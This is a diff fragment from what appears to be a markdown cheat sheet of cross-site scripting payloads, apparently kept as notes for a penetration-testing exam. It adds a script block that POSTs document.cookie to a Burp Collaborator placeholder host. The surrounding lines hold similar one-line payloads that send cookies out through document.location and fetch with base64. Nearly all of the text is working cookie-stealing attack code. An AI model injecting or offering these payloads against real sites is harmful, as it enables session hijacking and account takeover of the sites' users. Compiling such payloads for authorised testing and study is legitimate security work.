@@ -166,6 +166,16 @@ ${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 // adapt the payload in the exam depending of the parser
 \"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
 
+
+// in comments
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+
 ```
 
 #### DATA-STEALER
